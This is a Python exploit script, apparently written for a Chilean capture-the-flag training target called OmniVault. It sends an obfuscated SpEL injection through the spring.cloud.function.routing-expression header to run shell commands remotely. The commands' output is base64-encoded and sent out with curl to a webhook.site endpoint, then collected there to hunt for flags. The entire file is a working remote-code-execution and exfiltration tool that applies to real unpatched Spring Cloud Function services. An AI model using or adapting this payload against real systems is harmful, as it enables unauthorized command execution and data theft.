#!/usr/bin/env python3
"""
CTF Chile - Endpoints reales de OmniVault
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:20} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Explorando endpoints de OmniVault...")
# Endpoints basados en los archivos HTML que encontramos
probe("vault_root", "curl -s http://localhost:8080/")
probe("api_login", "curl -s http://localhost:8080/api/login")
probe("api_register", "curl -s http://localhost:8080/api/register")
probe("api_users", "curl -s http://localhost:8080/api/users")
probe("dashboard", "curl -s http://localhost:8080/dashboard.html")
probe("login_html", "curl -s http://localhost:8080/login.html")

print("[*] Probando endpoints administrativos...")
probe("api_admin", "curl -s http://localhost:8080/api/admin")
probe("api_internal", "curl -s http://localhost:8080/api/internal")
probe("api_config", "curl -s http://localhost:8080/api/config")
probe("api_status", "curl -s http://localhost:8080/api/status")

print("[*] Buscando endpoints relacionados con flags/vault...")
probe("api_vault", "curl -s http://localhost:8080/api/vault")
probe("api_accounts", "curl -s http://localhost:8080/api/accounts")
probe("api_transactions", "curl -s http://localhost:8080/api/transactions")
probe("api_debug", "curl -s http://localhost:8080/api/debug")

print("[*] Probando métodos POST en endpoints clave...")
probe("post_login", "curl -s -X POST http://localhost:8080/api/login -H 'Content-Type: application/json' -d '{\"rut\":\"admin\",\"password\":\"admin\"}'")
probe("post_debug", "curl -s -X POST http://localhost:8080/api/debug -H 'Content-Type: application/json' -d '{\"action\":\"status\"}'")

time.sleep(8)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=20", timeout=10)
data = r.json().get("data", [])

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)
            # Buscar flags en el contenido
            if "ctfchile{" in decoded.lower():
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")
        except Exception as e:
            print(f"(decode error) {raw[:150]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")